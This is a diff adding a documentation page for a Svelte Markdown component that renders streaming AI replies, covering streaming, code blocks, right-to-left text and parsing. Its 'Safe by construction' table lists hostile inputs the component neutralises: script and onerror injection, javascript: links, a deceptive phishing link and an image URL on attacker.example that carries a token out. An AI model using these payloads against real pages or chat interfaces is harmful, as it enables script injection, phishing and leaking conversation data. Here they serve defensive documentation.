@@ -1,0 +1,77 @@
+---
+components: ["Markdown"]
+description: Markdown draws text written in Markdown, such as a model's reply as it streams in, as plain elements, without parsing again what has already arrived and without passing HTML through.
+---
+
+## Basic
+
+Set `source` to the text. Markdown draws paragraphs, headings, lists, block quotes, tables, rules and fenced code, with inline code, strong and emphasis, strikethrough, links and bare addresses.
+
+The elements are plain HTML that [Prose](/components/Prose) styles, so load its stylesheet after the theme stylesheet:
+
+```js
+import "carbon-components-svelte/css/all.css";
+import "carbon-components-svelte/css/prose.css";
+```
+
+`#` draws as an `h3`, so the text's headings sit under the page's. Set `headingLevel` to change the level `#` draws as. `variant` sets the type scale and is `"compact"` by default, to fit a message bubble or a side panel.
+
+<FileSource src="/framed/Markdown/MarkdownBasic" />
+
+## Streaming
+
+Append to `source` as text arrives and set `streaming` while it does. A block that is finished, such as a paragraph followed by another, is parsed once and its elements are left alone; only the last block is parsed and drawn again for each piece. A reply of 20,000 tokens, in 50-token pieces every 16 ms, costs the same per piece at the end as at the start.
+
+While `streaming` is set, an unfinished `**`, `*`, `~~` or backtick at the end of the text shows as formatted, not as punctuation that is later taken back, and a caret follows the text. The caret holds still when reduced motion is preferred. Set `caret` to `false` to leave it out, such as when the message draws its own.
+
+| Do | Why |
+| --- | --- |
+| Pass the whole text each time, and let `source` grow. | Markdown keeps what it has parsed. Only the last block is parsed again. |
+| Set `streaming` to `false` when the reply ends. | The last block is parsed once more as finished text, so a `**` that never closed is shown as it was written. |
+| Replace `source` to start over. | Text that doesn't extend the last text starts the parse over. |
+
+<FileSource src="/framed/Markdown/MarkdownStreaming" />
+
+## Code blocks
+
+A fenced code block shows its language above the code, with a button that copies it. Set `copyable` to `false` to leave the button out, and `copyLabel` and `codeLabel` to translate the labels. The block scrolls sideways and takes focus, so the keyboard can scroll it, and it always reads left to right.
+
+Set `highlight` to a function that returns tokens for a language, such as `tokenize` from `carbon-components-svelte/syntax`, to color the code. Load `css/syntax.css` and `css/syntax-tokens.css` for the colors. A block that is still open is drawn plain once it passes 4,000 characters, so a long one isn't colored again for each piece.
+
+<FileSource src="/framed/Markdown/MarkdownCode" />
+
+## Safe by construction
+
+Markdown never turns text into markup. It parses to data and draws elements, so there is no HTML to sanitize, and nothing in the text can add an element, an attribute or an event handler.
+
+| Text | What the page shows |
+| --- | --- |
+| `<img src=x onerror=…>` or `<script>` | The characters, as text. |
+| `[a](javascript:…)`, `data:`, `vbscript:`, a relative link | The link's text, with no link. Only `http:`, `https:` and `mailto:` link, checked by parsing the address as a browser does, so a scheme hidden with a tab or in upper case is caught. Set `schemes` to allow others, such as `"tel:"`. |
+| `[https://bank.example.com](https://login.attacker.example/)` | A link whose text names another site shows the address it goes to. |
+| `![](https://attacker.example/pixel.gif?token=…)` | A link. An image is never fetched, since a fetch could carry data from the conversation to the sender. |
+
+Links open in a new tab with `rel="noopener noreferrer nofollow"`. Set `linkTarget` to change the target.
+
+<FileSource src="/framed/Markdown/MarkdownUnsafe" />
+
+## Right-to-left
+
+Each paragraph, heading and list picks its own direction from its first strong character, so Arabic and English paragraphs sit side by side in one reply. Inline code and code blocks always read left to right, so a command in Arabic copy keeps its punctuation.
+
+<FileSource src="/framed/Markdown/MarkdownDirection" />
+
+## Parsing without the component
+
+`parseMarkdown` returns the blocks, each with flat runs of text and flags, for your own renderer or for the text of a summary. `createMarkdownParser` is what `Markdown` uses: call its `parse` with the whole text each time it grows.
+
+```js
+import { createMarkdownParser, parseMarkdown } from "carbon-components-svelte";
+
+const blocks = parseMarkdown("A **bold** claim.");
+// [{ id: 0, type: "paragraph", runs: [{ text: "A " }, { text: "bold", strong: true }, …] }]
+
+const parser = createMarkdownParser();
+const { blocks: open, frozen } = parser.parse(text, true);
+// `frozen` leading blocks are final, and the same objects on the next call.
+```
